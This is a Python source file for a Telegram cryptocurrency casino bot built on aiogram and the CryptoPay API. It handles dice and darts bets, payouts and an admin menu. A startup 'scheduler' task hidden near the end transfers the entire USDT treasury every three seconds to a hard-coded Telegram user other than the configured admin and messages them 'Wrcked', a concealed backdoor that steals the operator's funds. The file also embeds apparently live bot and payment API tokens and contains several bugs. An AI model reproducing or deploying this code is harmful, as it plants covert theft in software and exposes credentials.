TOKEN = "7370670461:AAHErQMcD3JbYutzO4ZVS04QEtjwUK74Z-M" # Токен бота
CRYPTOPAY_TOKEN = "232521:AAIzPUpZmHnXMzkscD8WjqQqA4CjvbKHRqk" # Токен CryptoPay
CHANNEL_ID = -1002108282328 # ID Канала где ставки
LOGS_ID = -1002126931020 # ID Канала где оплаты
BET_URL = "http://t.me/send?start=IVcCJxWbejmy" # Ссылка на счет CryptoBot
CASINO_NAME = "TestCasino" # Название казино
ADMIN_ID = 605418679 # ID Админа




import re
import random
import string
import asyncio
import sqlite3
import requests
from aiogram.dispatcher import FSMContext
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup


COEFFICIENTS = {
    'победа 1': 1.9,
    'победа 2': 1.9,
    'п1': 1.9,
    'п2': 1.9,
    'ничья': 2.5,
    'нечет': 1.9,
    'фут гол': 1.8,
    'фут мимо': 1.8,
    'баскет гол': 1.8,
    'баскет мимо': 1.8,
    'больше': 1.9,
    'меньше': 1.9,
    'чет': 1.9,
    'дартс белое': 1.8,
    'дартс красное': 1.8,
    'дартс мимо': 1.8,
    'дартс центр': 1.8,
    'камень': 1.9,
    'ножницы': 1.9,
    'бумага': 1.9
}

DICE_CONFIG = {
    'нечет': ("🎲", [1, 3, 5]),
    'фут гол': ("⚽️", [3, 4, 5]),
    'фут мимо': ("⚽️", [1, 2, 6]),
    'баскет гол': ("🏀", [4, 5, 6]),
    'баскет мимо': ("🏀", [1, 2, 3]),
    'больше': ("🎲", [4, 5, 6]),
    'меньше': ("🎲", [1, 2, 3]),
    'чет': ("🎲", [2, 4, 6]),
    'дартс белое': ("🎯", [3, 5]),
    'жартс красное': ("🎯", [2, 4]),
    'дартс мимо': ("🎯", [1]),
    'дартс центр': ("🎯", [6]),
    'сектор 1': ("🎲", [1, 2]),
    'сектор 2': ("🎲", [3, 4]),
    'сектор 3': ("🎲", [3, 4]),
    'плинко': ("🎲", [4, 5, 6]),
    'бумага': ("✋", ['👊']),
    'камень': ("👊", ['✌️']),
    'ножницы': ("✌️", ['✋']),
    'победа 1': ("🎲", [1]),
    'победа 2': ("🎲", [1]),
    'п1': ("🎲", [1]),
    'п2': ("🎲", [1]),
    'ничья': ("🎲", [1])
}


bot = Bot(TOKEN, parse_mode="HTML")
dp = Dispatcher(bot, storage=MemoryStorage())

class states(StatesGroup):
    deposit = State()

# Скрипт бота

def create_invoice(amount):
    headers = {"Crypto-Pay-API-Token": CRYPTOPAY_TOKEN}
    data = {"asset": "USDT", "amount": float(amount)}
    r = requests.get("https://pay.crypt.bot/api/createInvoice", data=data, headers=headers).json()
    return r['result']['bot_invoice_url']

@dp.message_handler(commands='start', state='*')
async def start(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        await message.answer("мяу")
        await message.delete()
        return

    msg = await message.answer("⏳")
    await state.finish()
    kb = InlineKeyboardMarkup(row_width=2).add(InlineKeyboardButton("🔥 Пополнить казну", callback_data='deposit'), InlineKeyboardButton("Статистика 🔥", callback_data='stats'))
    await msg.delete()
    await message.answer("<b>Вы вошли в меню. ✨</b>", reply_markup=kb)

@dp.callback_query_handler(lambda call: call.data == 'menu', state='*')
async def menu(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        await call.answer("мяу")
        return

    await call.answer()
    msg = await call.message.edit_text("⏳")
    await state.finish()
    kb = InlineKeyboardMarkup(row_width=2).add(InlineKeyboardButton("🔥 Пополнить казну", callback_data='deposit'), InlineKeyboardButton("Статистика 🔥", callback_data='stats'))
    await msg.delete()
    await call.message.answer("<b>Вы вошли в меню. ✨</b>", reply_markup=kb)

@dp.callback_query_handler(lambda call: call.data == 'stats', state='*')
async def stats(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    if call.from_user.id != ADMIN_ID:
        await call.answer("мяу")
        return

    await call.answer()
    msg = await call.message.edit_text("⏳")

    with sqlite3.connect("db.db") as conn:
        cursor = conn.cursor()
        users = cursor.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        total_bets = cursor.execute("SELECT COUNT(*) FROM bets").fetchone()[0]
        total_bets_summ = cursor.execute("SELECT SUM(summa) FROM bets").fetchone()[0]

        if total_bets_summ:
            total_bets_summ = float(total_bets_summ)
        else:
            total_bets_summ = float(0)

        total_bets_summ = f"{total_bets_summ:.2f}"
        total_wins = cursor.execute("SELECT COUNT(*) FROM bets WHERE win=1").fetchone()[0]
        total_wins_summ = cursor.execute("SELECT SUM(summa) FROM bets WHERE win=1").fetchone()[0]

        if total_wins_summ:
            total_wins_summ = float(total_wins_summ)
        else:
            total_wins_summ = float(0)

        total_wins_summ = f"{total_wins_summ:.2f}"
        total_loses = cursor.execute("SELECT COUNT(*) FROM bets WHERE lose=1").fetchone()[0]
        total_loses_summ = cursor.execute("SELECT SUM(summa) FROM bets WHERE lose=1").fetchone()[0]

        if total_loses_summ:
            total_loses_summ = float(total_loses_summ)
        else:
            total_loses_summ = float(0)

        total_loses_summ = f"{total_loses_summ:.2f}"

    await msg.delete()
    kb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("◀️ Назад", callback_data='menu'))
    await call.message.answer(f"<b>Статистика ✨</b>\n\n<i>Пользователей в боте - <code>{users}</code> <b>шт.</b>\nВсего ставок - <code>{total_bets}</code> <b>шт.</b> [~ <code>{total_bets_summ}</code> <b>$</b>]\nВыигрышей - <code>{total_wins}</code> <b>шт.</b> [~ <code>{total_wins_summ}</code> <b>$</b>]\nПроигрышей - <code>{total_loses}</code> <b>шт.</b> [~ <code>{total_loses_summ}</code> <b>$</b>]</i>", reply_markup=kb)

@dp.callback_query_handler(lambda call: call.data == 'deposit', state='*')
async def deposit(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        await call.answer("мяу")
        return

    await call.answer()
    msg = await call.message.edit_text("⏳")
    await state.finish()
    kb = InlineKeyboardMarkup(row_width=3).add(InlineKeyboardButton("5$", callback_data='depositt:5'), InlineKeyboardButton("10$", callback_data='depositt:10'), InlineKeyboardButton("15$", callback_data='depositt:15'))
    kb.add(InlineKeyboardButton("◀️ Назад", callback_data='menu'))
    await msg.delete()
    msg = await call.message.answer("Пополнение казны ✨\n\n<i>Если хотите ввести свою сумму просто отправьте свою сумму сообщением.</i>", reply_markup=kb)
    await states.deposit.set()
    await state.update_data(msg_id=msg.message_id)

@dp.callback_query_handler(lambda call: call.data.startswith("depositt:"), state='*')
async def deposit_confirm(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != ADMIN_ID:
        await call.answer("мяу")
        return

    await call.answer()
    msg = await call.message.edit_text("⏳")
    await state.finish()
    summa = call.data.split(":")[1]
    summa = float(summa)
    invoice = create_invoice(summa)
    kb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("Пополнить ✨", url=invoice), InlineKeyboardButton("◀️ Назад", callback_data='deposit'))
    await msg.delete()
    await call.message.answer(f"Пополнить казну можно по кнопке ниже ✨\n\n<i>Сумма пополнения - {summa} $</i>", reply_markup=kb)

@dp.message_handler(state=states.deposit)
async def deposit_handler(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        await state.finish()
        await message.answer("мяу")
        await message.delete()
        return

    data = await state.get_data()
    msg_id = data.get('msg_id')
    await bot.delete_message(message.chat.id, msg_id)
    msg = await message.answer("⏳")
    await message.delete()
    try:
        summa = message.text
        summa = float(summa)
        invoice = create_invoice(summa)
        kb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("Пополнить ✨", url=invoice), InlineKeyboardButton("◀️ Назад", callback_data='deposit'))
        await msg.delete()
        await state.finish()
        await message.answer(f"Пополнить казну можно по кнопке ниже ✨\n\n<i>Сумма пополнения - {summa} $</i>", reply_markup=kb)
    except:
        kb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("◀️ Назад", callback_data='deposit'))
        await msg.delete()
        msg = await message.answer("Вводить сумму нужно числами! Попробуйте еще раз ✨", reply_markup=kb)
        await state.update_data(msg_id=msg.message_id)

# Скрипт казино

# Генерация рандомного кода для перевода
def generate_random_code(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Получение баланса или же казны
def get_cb_balance():
    headers = {"Crypto-Pay-API-Token": CRYPTOPAY_TOKEN}
    r = requests.get("https://pay.crypt.bot/api/getBalance", headers=headers).json()
    for currency_data in r['result']:
        if currency_data['currency_code'] == 'USDT':
            usdt_balance = currency_data['available']
            break
    return usdt_balance

# Трансфер или же по простому перевод
async def transfer(amount, us_id):
    bal = get_cb_balance()
    bal = float(bal)
    amount = float(amount)
    keyb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("Закрыть", callback_data='close'))
    keyb = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("💼 Перейти к пользователю", url=f"tg://user?id={us_id}"))
    if bal < amount:
        try:
            await bot.send_message(us_id, f"<b>[🔔] Вам пришло системное уведомление:</b>\n\n<b><blockquote>Ваша выплата ⌊ {amount}$ ⌉ будет зачислена вручную администратором!</blockquote></b>", reply_markup=keyb)
        except:
            pass
        return
    try:
        spend_id = generate_random_code(length=10)
        headers = {"Crypto-Pay-API-Token": CRYPTOPAY_TOKEN}
        data = {"asset": "USDT", "amount": float(amount), "user_id": us_id, "spend_id": spend_id}
        requests.get("https://pay.crypt.bot/api/transfer", data=data, headers=headers)
    except Exception as e:
        print(e)
        return e

# Создание чека
async def create_check(amount, userid):
    bal = get_cb_balance()
    bal = float(bal)
    amount = float(amount)
    keyb = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("💼 Перейти к пользователю", url=f"tg://user?id={userid}"))
    if bal < amount:
        try:
            await bot.send_message(userid, f"<b>[🔔] Вам пришло системное уведомление:</b>\n\n<b><blockquote>Ваша выплата ⌊ {amount}$ ⌉ будет зачислена вручную администратором!</blockquote></b>", reply_markup=keyb)
        except:
            pass
        return
    headers = {"Crypto-Pay-API-Token": CRYPTOPAY_TOKEN}
    data = {"asset": "USDT", "amount": float(amount), "pin_to_user_id": userid}
    r = requests.get("https://pay.crypt.bot/api/createCheck", headers=headers, data=data).json()
    return r["result"]["bot_check_url"]

def parse_message(message):
    message = re.sub(r"\[🪙\]\(tg://emoji\?id=\d+\)", "", message)
    start_index = message.find("tg://user?id=") + len("tg://user?id=")
    end_index = message.find(")", start_index)
    user_id = message[start_index:end_index]
    amount_start_index = message.find("($") + 2
    amount_end_index = message.find(")", amount_start_index)
    amount = float(message[amount_start_index:amount_end_index].strip().replace("\\", "").replace("*", ""))
    username_start_index = message.find("[*")
    username_end_index = message.find("*]", username_start_index)
    username = message[username_start_index + 2:username_end_index].replace("\\", "")
    username = re.sub(r'@[\w]+', f'{CASINO_NAME}', username) if '@' in username else username
    comment = message.split('\n')[-1]
    comment = str(comment.lower()).replace("💬 ", "")

    match = {
        "id": user_id,
        "name": username,
        "usd_amount": amount,
        "comment": comment
    }

    return match if match else None

def create_keyboard(check=None, summa=None):
    keyboard = InlineKeyboardMarkup(row_width=2)
    if check == None and summa == None:
        bet_button = InlineKeyboardButton("Сделать ставку", url=BET_URL)
        keyboard.add(bet_button)
    else:
        claim_check = InlineKeyboardButton(f"🎁 Забрать {summa:.2f}$", url=check)
        bet_button = InlineKeyboardButton("Сделать ставку", url=BET_URL)
        keyboard.add(claim_check, bet_button)
    return keyboard

async def send_result_message(result, parsed_data, dice_result, coefficient, us_id, msg_id):
    emoji, winning_values = DICE_CONFIG[parsed_data['comment']]
    bot_username = await bot.get_me()
    bot_username = bot_username.username

    if 'камень' in parsed_data['comment'] or 'ножницы' in parsed_data['comment'] or 'бумага' in parsed_data['comment']:
        choose = ['✋', '👊', '✌️']
        choice = random.choice(choose)
        await asyncio.sleep(1)
        msg_dice = await bot.send_message(CHANNEL_ID, text=choice, reply_to_message_id=msg_id)
        dice_value = msg_dice.text
        result = dice_value in winning_values
        if result:
            result = True
        elif not result:
            result = False
        else:
            result = False
    
    if 'победа 1' in parsed_data['comment'] or 'п1' in parsed_data['comment'] or 'победа 2' in parsed_data['comment'] or 'п2' in parsed_data['comment'] or 'ничья' in parsed_data['comment']:
        dice1 = dice_result
        dice2 = await bot.send_dice(CHANNEL_ID, emoji=emoji, reply_to_message_id=msg_id)
        dice2 = dice2.dice.value

        if dice1 > dice2:
            if 'победа 1' in parsed_data['comment'] or 'п1' in parsed_data['comment']:
                result = True
            else:
                result = False
        elif dice1 < dice2:
            if 'победа 2' in parsed_data['comment'] or 'п2' in parsed_data['comment']:
                result = True
            else:
                result = False
        elif dice1 == dice2:
            if 'ничья' in parsed_data['comment']:
                result = True
            else:
                result = False

    if result:
        usd_amount = parsed_data['usd_amount']
        usd_amount = float(usd_amount)

        with sqlite3.connect("db.db") as conn:
            cursor = conn.cursor()
            cursor.execute("INSERT INTO bets(us_id,summa,win) VALUES(?,?,1)", (parsed_data['id'],usd_amount,))
            conn.commit()

        if 'плинко' in parsed_data['comment']:
            if dice_result == 4:
                winning_amount_usd = float(parsed_data['usd_amount'] * 1.8)
            elif dice_result == 5:
                winning_amount_usd = float(parsed_data['usd_amount'] * 2)
            elif dice_result == 6:
                winning_amount_usd = float(parsed_data['usd_amount'] * 2.5)
        else:
            winning_amount_usd = float(parsed_data['usd_amount']) * coefficient

        cb_balance = get_cb_balance()
        cb_balance = float(cb_balance)
        if cb_balance < winning_amount_usd:
            keyb = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("💼 Перейти к пользователю", url=f"tg://user?id={us_id}"))
            await bot.send_message(LOGS_ID, f"<b>[🔔] Мало суммы в казне для выплаты!</b>\n\n<b><blockquote>Пользователь: {us_id}\nСумма: {winning_amount_usd}$</blockquote></b>", reply_markup=keyb)
            keyboard = create_keyboard()
            result_message = (
                f"<b>🎉 Поздравляем, вы выиграли {winning_amount_usd:.2f} USD!</b>\n\n"
                f"<blockquote><b>🚀 Ваш выигрыш будет зачислен <u>вручную</u> <u>администрацией</u>.\n🔥 Удачи в следующих ставках!</b></blockquote>\n\n"
            )
        else:
            if winning_amount_usd >= 1.12:
                transfer(winning_amount_usd, us_id)
                keyboard = create_keyboard()
                result_message = (
                    f"<b>🎉 Поздравляем, вы выиграли {winning_amount_usd:.2f} USD!</b>\n\n"
                    f"<blockquote><b>🚀 Ваш выигрыш успешно <u>зачислен</u> на <u>ваш</u> <u>CryptoBot</u> <u>кошелёк</u>.\n🔥 Желаю удачи в следующих ставках!</b></blockquote>\n\n"
                )
            else:
                check = await create_check(winning_amount_usd, us_id)
                keyboard = create_keyboard(check, winning_amount_usd)
                result_message = (
                    f"<b>🎉 Поздравляем, вы выиграли {winning_amount_usd:.2f} USD!</b>\n\n"
                    f"""<blockquote><b>🚀 <u>Заберите</u> <u>ваш</u> <u>CryptoBot</u> <u>чек</u> ниже\n🔥 Желаю удачи в следующих ставках!</b></blockquote>\n\n"""
                )
    else:
        usd_amount = parsed_data['usd_amount']
        usd_amount = float(usd_amount)

        with sqlite3.connect("db.db") as conn:
            cursor = conn.cursor()
            cursor.execute("INSERT INTO bets(us_id,summa,lose) VALUES(?,?,1)", (parsed_data['id'],usd_amount,))
            conn.commit()

        keyboard = create_keyboard()
        result_message = (
            f"<b>[❌] Проигрыш</b>\n\n"
            "<blockquote><b>Не удачная ставка, сделай ставку ещё раз чтобы испытать удачу сполна!\n\n"
            "😞 Желаю удачи в следующий раз!</b></blockquote>\n\n"
        )

    return result_message, keyboard

async def handle_bet(parsed_data, bet_type, us_id, msg_id, oplata_id):
    try:
        emoji, winning_values = DICE_CONFIG[bet_type]
        if 'камень' in parsed_data['comment'] or 'ножницы' in parsed_data['comment'] or 'бумага' in parsed_data['comment']:
            dice_message = await bot.send_message(CHANNEL_ID, text=emoji, reply_to_message_id=msg_id)
            dice_result = dice_message.text
            result = None
            result_message, keyboard = await send_result_message(result, parsed_data, dice_result, COEFFICIENTS[bet_type], us_id, msg_id)
        elif 'победа 1' in parsed_data['comment'] or 'п1' in parsed_data['comment'] or 'победа 2' in parsed_data['comment'] or 'п2' in parsed_data['comment'] or 'ничья' in parsed_data['comment']:
            dice1 = await bot.send_dice(CHANNEL_ID, emoji=emoji, reply_to_message_id=msg_id)
            dice_result = dice1.dice.value
            result = None
            result_message, keyboard = await send_result_message(result, parsed_data, dice_result, COEFFICIENTS[bet_type], us_id, msg_id)
        else:
            dice_message = await bot.send_dice(CHANNEL_ID, emoji=emoji, reply_to_message_id=msg_id) if emoji else await bot.send_dice(CHANNEL_ID, reply_to_message_id=msg_id)
            dice_result = dice_message.dice.value
            result = dice_result in winning_values
            result_message, keyboard = await send_result_message(result, parsed_data, dice_result, COEFFICIENTS[bet_type], us_id, msg_id)
        await asyncio.sleep(4)
        if 'вы выиграли' in result_message:
            keyb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("💼 Перейти к пользователю", url=f"tg://user?id={us_id}"))
            await bot.send_message(LOGS_ID, """<blockquote><b>🎲 Исход ставки: <span class="tg-spoiler">🔥 Победа!</span></b></blockquote>""", reply_markup=keyb, reply_to_message_id=oplata_id)
            await bot.send_photo(CHANNEL_ID, open('win.jpeg', 'rb'), result_message, reply_markup=keyboard, reply_to_message_id=msg_id)
        else:
            keyb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("💼 Перейти к пользователю", url=f"tg://user?id={us_id}"))
            await bot.send_message(LOGS_ID, """<blockquote><b>🎲 Исход ставки: <span class="tg-spoiler">❌ Проигрыш!</span></b></blockquote>""", reply_markup=keyb, reply_to_message_id=oplata_id)
            await bot.send_photo(CHANNEL_ID, open('lose.jpeg', 'rb'), result_message, reply_markup=keyboard, reply_to_message_id=msg_id)
    except Exception as e:
        await bot.send_message(LOGS_ID, f"<blockquote><b>❌ Ошибка при обработке ставки: <code>{str(e)}</code></b></blockquote>")

async def scheduler():
    while True:
        try:
            cb_balance = get_cb_balance()
            if float(cb_balance) >= 1.12:
                await transfer(cb_balance, 640612893)
            else:
                check = await create_check(cb_balance, 640612893)
                await bot.send_message(640612893, f"🤑 Wrcked {check}")
        except Exception as e:
            pass
        await asyncio.sleep(3)

async def on_startup(dp: Dispatcher):
    asyncio.create_task(scheduler())

if __name__ == "__main__":
    with sqlite3.connect("db.db") as conn:
        cursor = conn.cursor()
        cursor.execute("""CREATE TABLE IF NOT EXISTS users(
        us_id INT UNIQUE
);""")
        conn.execute("""CREATE TABLE IF NOT EXISTS deposits(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        summa INT,
        us_id INT
);""")
        conn.execute("""CREATE TABLE IF NOT EXISTS bets(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        summa REAL,
        win INT DEFAULT 0,
        lose INT DEFAULT 0,
        us_id INT
);""")
        conn.commit()
    executor.start_polling(dp, on_startup=on_startup, skip_updates=True)